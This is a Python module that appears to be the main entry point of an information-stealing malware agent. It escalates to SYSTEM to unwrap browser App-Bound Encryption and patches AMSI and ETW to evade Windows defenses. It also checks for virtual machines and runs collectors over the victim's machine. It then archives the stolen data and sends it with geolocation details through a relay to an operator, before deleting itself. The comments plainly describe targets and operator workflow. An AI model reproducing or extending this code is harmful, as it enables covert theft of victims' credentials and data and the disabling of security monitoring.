"""Agent entry point.

The order is fixed and every step depends on the one before it:

1. ``--abe-unwrap`` dispatch. The helper runs as SYSTEM with no config and no
   archive of its own, so it is handled before logging, before the mutex, before
   the gate, before anything that could read a file it does not have.
2. Log setup, then the AMSI and ETW patches. Neither is gated on: a patch that
   fails is a logged False, not a stopped run.
3. Mutex guard, in the loader, before decryption. Two launches must not race the
   decrypted archive.
4. Footer, decryption, mount. The loader owns every one of those.
5. Config, gate, collection, transmission, self-remove.

Nothing here decrypts. Nothing here reads the footer.
"""

from __future__ import annotations

import sys
from typing import Final

UNWRAP_FLAG: Final[str] = "--abe-unwrap"
DEBUG_FLAG: Final[str] = "--debug"


def _summary() -> dict:
    """Machine facts for the status messages. Never raises, never blocks a run.

    Gathered once and reused: the geolocation lookup costs a network round trip, and
    three messages asking the same question three times is three chances to time out
    on a target that is about to be killed.
    """
    try:
        from .sources import network, system

        facts = system.identity()
        facts.update(network.location())
        return facts
    except Exception:
        return {}


def _status(block: str, status: str) -> str:
    """One status line under the machine block.

    The block is already markdown; this only decides whether there is one. A run with
    no machine facts still sends the stage, because a bare "delivered" is worth more
    than the nothing it replaces.
    """
    return f"{block}\n**status** {status}" if block else f"**status** {status}"


def main(argv: list[str] | None = None) -> int:
    args = list(sys.argv[1:] if argv is None else argv)

    # Must be first. The helper is a re-exec of this same entry point under SYSTEM.
    if UNWRAP_FLAG in args:
        from . import abe

        return abe.helper_main(args)

    from . import log

    logger = log.configure(debug=DEBUG_FLAG in args)
    logger.debug("agent start: argv=%s", args)

    # Imported after the log is live: importing winapi creates the WinDLL handles.
    from . import config, gate, loader, patch, relay, sources, util

    logger.debug("amsi patch: %s", patch.patch_amsi())
    logger.debug("etw patch: %s", patch.patch_etw())

    if not loader.acquire():
        logger.debug("another instance holds the mutex; exiting")
        return 0

    try:
        prepared = loader.prepare()
    except Exception:
        logger.exception("archive preparation failed")
        return 1

    try:
        try:
            cfg = config.load(prepared.archive)
        except Exception:
            logger.exception("config rejected")
            return 1

        # Gathered before anything that can fail, so the first message carries the
        # machine rather than a promise that one is coming.
        summary = _summary()
        block = relay.describe(summary)
        relay.notify(cfg, _status(block, "collecting"), alert=True)

        # The gate never stops a run. A virtual host produces a stamped result and
        # everything else proceeds; a silent exit teaches nobody anything.
        verdict = gate.evaluate()
        logger.debug("gate: virtual=%s hits=%s", verdict.virtual, verdict.hits)
        logger.debug("gate reasons: %s", verdict.reasons)
        gate_note = (
            "virtual (" + ", ".join(str(hit) for hit in verdict.hits) + ")"
            if verdict.virtual
            else "clean"
        )
        summary["gate"] = gate_note

        with util.temp_workspace("sable-collect-") as work:
            if verdict.virtual:
                util.write_json(
                    work / "virtual.txt",
                    {
                        "virtual": verdict.virtual,
                        "hits": list(verdict.hits),
                        "reasons": list(verdict.reasons),
                    },
                )

            counts, failures = sources.run_all(work, cfg)
            logger.debug("collectors returned %s", counts)
            if failures:
                # Carried into the delivery caption: a source that died is the one thing
                # a bare item count can never tell you.
                summary["failed"] = failures
                logger.warning("collectors failed: %s", failures)

            archive_path = util.make_archive(work, prepared.workspace / "payload.zip")
            if archive_path is None:
                logger.error("archive creation failed")
                relay.notify(
                    cfg,
                    _status(block, f"collection produced no archive · gate {gate_note}"),
                    alert=True,
                )
                return 1

            try:
                size = archive_path.stat().st_size
            except OSError:
                size = 0
            items = sum(counts.values())

            # Before transmission, so a failed upload still leaves something to open on
            # a machine the operator controls. Off unless the build asked for it.
            if cfg.keep_local:
                kept = util.keep_archive(
                    archive_path, str(summary.get("hostname") or "sable")
                )
                if kept is not None:
                    util.write_text(
                        kept.with_suffix(".txt"),
                        f"{relay.describe(summary)}\n"
                        f"**archive** {kept.name}\n"
                        f"**items** {items:,}\n",
                    )
                    relay.notify(cfg, _status("", f"local copy · {kept}"))

            relay.notify(
                cfg,
                _status("", f"uploading {items:,} items · {relay.human_bytes(size)}"),
            )

            # The archive that leaves the machine is password protected. Until now the
            # seal key only wrapped the bundle welded inside the exe, so a link relay put
            # a plain zip on a public host and anyone holding the URL could open it. The
            # key is the password; a failure here falls back to the plain archive rather
            # than costing the delivery.
            shipped = archive_path
            sealed = util.seal_zip(
                archive_path,
                archive_path.with_name("payload-sealed.zip"),
                cfg.seal_key,
            )
            if sealed is not None:
                shipped = sealed
            else:
                relay.notify(cfg, _status("", "sealing failed · sending the plain archive"))

            try:
                relay.transmit(cfg, shipped, summary)
            except Exception as exc:
                logger.exception("transmit failed")
                relay.notify(
                    cfg,
                    _status(block, f"transmit failed · {exc} · gate {gate_note}"),
                    alert=True,
                )
                return 1

            # The file message already carries the block and the mention; repeating
            # both here would buzz twice for one delivery.
            relay.notify(cfg, _status("", "delivered"))

        if cfg.self_remove:
            util.self_remove(util.executable_path())

        return 0
    finally:
        loader.cleanup()


if __name__ == "__main__":
    raise SystemExit(main())
